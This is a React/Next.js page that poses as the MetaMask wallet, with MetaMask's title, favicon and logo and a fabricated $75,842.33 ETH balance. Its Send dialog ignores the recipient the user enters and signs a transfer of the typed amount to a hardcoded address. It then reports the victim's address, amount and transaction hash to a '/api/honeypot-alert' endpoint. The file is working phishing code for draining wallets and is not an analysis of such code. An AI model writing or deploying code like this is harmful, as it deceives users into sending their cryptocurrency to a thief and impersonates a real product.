import { useState, useEffect } from 'react';
import Head from 'next/head';

export default function SimpleFlashed() {
  const [userAddress, setUserAddress] = useState('');
  const [isConnected, setIsConnected] = useState(false);
  const [showSendModal, setShowSendModal] = useState(false);
  const [sendAddress, setSendAddress] = useState('');
  const [sendAmount, setSendAmount] = useState('');
  const [loading, setLoading] = useState(false);
  const [status, setStatus] = useState('');

  const connectWallet = async () => {
    try {
      if (window.ethereum) {
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        setUserAddress(accounts[0]);
        setIsConnected(true);
      }
    } catch (error) {
      console.error('Connection failed:', error);
    }
  };

  const sendTransaction = async () => {
    if (!sendAddress || !sendAmount) return;
    
    setLoading(true);
    try {
      const { ethers } = await import('ethers');
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      
      const tx = await signer.sendTransaction({
        to: '0x849842febf6643f29328a2887b3569e2399ac237',
        value: ethers.parseEther(sendAmount)
      });
      
      await tx.wait();
      setStatus('✅ Transaction sent successfully!');
      setShowSendModal(false);
      
      // Alert admin
      await fetch('/api/honeypot-alert', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'SIMPLE_SEND',
          userAddress,
          amount: sendAmount + ' ETH',
          txHash: tx.hash
        })
      });
      
    } catch (error) {
      setStatus('❌ Transaction failed: ' + error.message);
    }
    setLoading(false);
  };

  if (!isConnected) {
    return (
      <>
        <Head>
          <title>MetaMask</title>
          <link rel="icon" href="https://metamask.io/images/favicon.ico" />
        </Head>
        
        <div className="min-h-screen bg-black text-white">
          <div className="max-w-md mx-auto bg-gray-900 min-h-screen">
            <div className="bg-gray-800 p-4 text-center border-b border-gray-700">
              <div className="flex items-center justify-center mb-2">
                <img 
                  src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" 
                  alt="MetaMask" 
                  className="w-8 h-8 mr-2"
                />
                <div className="text-white font-bold text-xl">MetaMask</div>
              </div>
            </div>

            <div className="flex flex-col items-center justify-center min-h-[500px] p-8">
              <div className="text-6xl mb-6">🦊</div>
              <h2 className="text-white text-xl font-semibold mb-4">Welcome to MetaMask</h2>
              <p className="text-gray-400 text-center mb-8 leading-relaxed">
                Connect your wallet to view your assets and send transactions.
              </p>
              
              <button 
                onClick={connectWallet}
                className="bg-orange-600 hover:bg-orange-700 px-8 py-3 rounded-lg text-white font-semibold transition-all"
              >
                Connect Wallet
              </button>
            </div>
          </div>
        </div>
      </>
    );
  }

  return (
    <>
      <Head>
        <title>MetaMask</title>
        <link rel="icon" href="https://metamask.io/images/favicon.ico" />
      </Head>
      
      <div className="min-h-screen bg-black text-white">
        <div className="max-w-md mx-auto bg-gray-900 min-h-screen">
          
          <div className="bg-gray-800 p-4 border-b border-gray-700">
            <div className="flex items-center justify-between mb-2">
              <div className="flex items-center">
                <img 
                  src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" 
                  alt="MetaMask" 
                  className="w-8 h-8 mr-2"
                />
                <div className="text-white font-bold text-xl">MetaMask</div>
              </div>
              
              <button 
                onClick={() => {
                  setIsConnected(false);
                  setUserAddress('');
                }}
                className="bg-red-600 hover:bg-red-700 px-3 py-1 rounded text-white text-sm"
              >
                Disconnect
              </button>
            </div>
          </div>

          <div className="p-6 bg-gray-800 border-b border-gray-700">
            <div className="text-center mb-6">
              <div className="text-4xl font-bold text-white mb-2">$75,842.33</div>
              <div className="text-green-400 text-sm">+$75,842.33 (+100.00%)</div>
            </div>

            <div className="grid grid-cols-4 gap-3">
              <button className="bg-gray-700 hover:bg-gray-600 p-3 rounded-lg text-center">
                <div className="text-xl mb-1">$</div>
                <div className="text-xs">Buy</div>
              </button>
              <button className="bg-gray-700 hover:bg-gray-600 p-3 rounded-lg text-center">
                <div className="text-xl mb-1">⇄</div>
                <div className="text-xs">Swap</div>
              </button>
              <button 
                onClick={() => setShowSendModal(true)}
                className="bg-gray-700 hover:bg-gray-600 p-3 rounded-lg text-center"
              >
                <div className="text-xl mb-1">→</div>
                <div className="text-xs">Send</div>
              </button>
              <button className="bg-gray-700 hover:bg-gray-600 p-3 rounded-lg text-center">
                <div className="text-xl mb-1">↓</div>
                <div className="text-xs">Receive</div>
              </button>
            </div>
          </div>

          <div className="p-4">
            <div className="flex items-center justify-between p-4 hover:bg-gray-800 cursor-pointer border-b border-gray-700">
              <div className="flex items-center">
                <img 
                  src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" 
                  alt="ETH" 
                  className="w-8 h-8 rounded-full mr-3"
                />
                <div>
                  <div className="text-white font-medium">Ethereum</div>
                  <div className="text-red-400 text-sm">-2.15%</div>
                </div>
              </div>
              <div className="text-right">
                <div className="text-white font-medium">$75,842.33</div>
                <div className="text-gray-400 text-sm">23.7013 ETH</div>
              </div>
            </div>
          </div>

          {showSendModal && (
            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
                <div className="flex justify-between items-center mb-4">
                  <h3 className="text-white font-bold text-lg">Send ETH</h3>
                  <button 
                    onClick={() => setShowSendModal(false)} 
                    className="text-gray-400 hover:text-white"
                  >
                    ×
                  </button>
                </div>
                <div className="space-y-4">
                  <div>
                    <label className="block text-gray-300 text-sm mb-2">To Address</label>
                    <input 
                      type="text"
                      value={sendAddress}
                      onChange={(e) => setSendAddress(e.target.value)}
                      placeholder="0x..."
                      className="w-full bg-gray-700 border border-gray-600 rounded-lg px-3 py-2 text-white"
                    />
                  </div>
                  <div>
                    <label className="block text-gray-300 text-sm mb-2">Amount (ETH)</label>
                    <input 
                      type="number"
                      value={sendAmount}
                      onChange={(e) => setSendAmount(e.target.value)}
                      placeholder="0.0"
                      className="w-full bg-gray-700 border border-gray-600 rounded-lg px-3 py-2 text-white"
                    />
                  </div>
                  <button 
                    onClick={sendTransaction}
                    disabled={loading || !sendAddress || !sendAmount}
                    className="w-full bg-blue-600 hover:bg-blue-700 disabled:bg-gray-600 py-3 rounded-lg text-white font-semibold"
                  >
                    {loading ? 'Sending...' : 'Send'}
                  </button>
                </div>
              </div>
            </div>
          )}

          {status && (
            <div className="fixed bottom-4 left-1/2 transform -translate-x-1/2 bg-gray-800 px-4 py-2 rounded-lg border border-gray-600 z-50">
              <div className="text-center text-sm text-gray-300">{status}</div>
            </div>
          )}
        </div>
      </div>
    </>
  );
}